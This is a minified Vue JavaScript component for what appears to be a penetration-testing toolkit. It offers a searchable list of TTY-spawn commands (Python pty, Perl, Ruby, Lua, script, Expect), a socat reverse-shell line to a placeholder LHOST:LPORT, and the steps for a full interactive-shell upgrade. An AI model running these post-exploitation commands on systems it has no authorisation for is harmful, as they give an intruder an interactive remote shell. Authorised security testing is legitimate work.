import{u as T,i as B}from"./action-DPETLen1.js";import{l as I,ay as z,z as w,A as f,H as d,y as o,C as i,J as h,u as m,I as r,K as l,E as S,V as v,L as y,D as E,G as V}from"./vendor-D2QpS8Sq.js";import{_ as O}from"./tool-gzyGz11_.js";import"./vendor-lodash-BDISS5yc.js";import"./modulepreload-polyfill-B5Qt9EMX.js";import"./vendor-monaco-CZQ85J0D.js";const D={key:0,class:"sectool-tty-count"},H={class:"sectool-tty-section-title"},M={key:1,class:"sectool-tty-empty"},N={class:"sectool-tty-section-title",style:{"margin-top":"10px"}},q={class:"sectool-tty-upgrade-desc"},F={class:"sectool-tty-step-label"},G=I({__name:"TtySpawn",async setup(U){let u,C;const L=[{id:"py1",name:"Python",category:"Python",command:`python -c 'import pty; pty.spawn("/bin/bash")'`},{id:"py2",name:"Python3",category:"Python",command:`python3 -c 'import pty; pty.spawn("/bin/bash")'`},{id:"sc1",name:"Script (quiet)",category:"Script",command:"script -qc /bin/bash /dev/null"},{id:"sc2",name:"Script",category:"Script",command:"script /dev/null"},{id:"pl1",name:"Perl",category:"Perl",command:`perl -e 'exec "/bin/bash";'`},{id:"rb1",name:"Ruby",category:"Ruby",command:`ruby -e 'exec "/bin/bash"'`},{id:"lu1",name:"Lua",category:"Lua",command:`lua -e "os.execute('/bin/bash')"`},{id:"irb1",name:"IRB",category:"IRB",command:'exec "/bin/bash"'},{id:"ex1",name:"Expect",category:"Expect",command:"expect -c 'spawn /bin/bash; interact'"},{id:"so1",name:"Socat",category:"Socat",command:"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT"}],x=[{descKey:"step1_desc",command:`python3 -c 'import pty; pty.spawn("/bin/bash")'`},{descKey:"step2_desc",command:""},{descKey:"step3_desc",command:"stty raw -echo; fg"},{descKey:"step4_desc",command:"export TERM=xterm"},{descKey:"step5_desc",command:"stty rows ROW cols COL"}],R=[...new Set(L.map(e=>e.category))],$=[{value:"_all",label:"All"},...R.map(e=>({value:e,label:e}))],c=T(([u,C]=z(()=>B({selectedCategory:"_all",search:""})),u=await u,C(),u)),_=V(()=>{const e=(c.current.search||"").toLowerCase().trim(),n=c.current.selectedCategory,g=L.filter(t=>n!=="_all"&&t.category!==n?!1:e?t.name.toLowerCase().includes(e)||t.command.toLowerCase().includes(e)||t.category.toLowerCase().includes(e):!0),p=new Map;for(const t of g)p.has(t.category)||p.set(t.category,[]),p.get(t.category).push(t);return Array.from(p.entries()).map(([t,b])=>({category:t,commands:b}))}),A=V(()=>_.value.reduce((e,n)=>e+n.commands.length,0));return(e,n)=>{const g=d("Select"),p=d("Input"),t=d("Align"),b=d("Display"),k=d("Textarea"),K=d("HeightResize");return o(),w(K,null,{default:f(({height:P})=>[i("div",{style:E([{height:P+"px"},{overflow:"auto",padding:"5px"}])},[h(b,null,{default:f(()=>[h(t,{direction:"vertical"},{default:f(()=>[h(g,{modelValue:m(c).current.selectedCategory,"onUpdate:modelValue":n[0]||(n[0]=a=>m(c).current.selectedCategory=a),label:e.$t("ttySpawn_category"),options:$},null,8,["modelValue","label"]),h(p,{modelValue:m(c).current.search,"onUpdate:modelValue":n[1]||(n[1]=a=>m(c).current.search=a),label:e.$t("ttySpawn_search"),placeholder:e.$t("ttySpawn_search_placeholder")},null,8,["modelValue","label","placeholder"])]),_:1})]),_:1}),_.value.length>0?(o(),r("div",D,l(e.$t("ttySpawn_result_count",[A.value])),1)):S("",!0),(o(!0),r(y,null,v(_.value,a=>(o(),r(y,{key:a.category},[i("div",H,l(a.category),1),(o(!0),r(y,null,v(a.commands,s=>(o(),w(k,{key:s.id,"model-value":s.command,height:42,placeholder:s.name,copy:s.name},null,8,["model-value","placeholder","copy"]))),128))],64))),128)),_.value.length===0&&m(c).current.search?(o(),r("div",M,l(e.$t("ttySpawn_empty")),1)):S("",!0),i("div",N,l(e.$t("ttySpawn_full_upgrade_title")),1),i("div",q,l(e.$t("ttySpawn_full_upgrade_desc")),1),(o(),r(y,null,v(x,(a,s)=>(o(),r(y,{key:"upgrade-"+s},[i("div",F,l(e.$t("ttySpawn_step",[s+1]))+": "+l(e.$t("ttySpawn_"+a.descKey)),1),a.command?(o(),w(k,{key:0,"model-value":a.command,height:42,placeholder:"Step "+(s+1),copy:"Step "+(s+1)},null,8,["model-value","placeholder","copy"])):S("",!0)],64))),64))],4)]),_:1})}}}),Z=O(G,[["__scopeId","data-v-c60b4f1a"]]);export{Z as default};
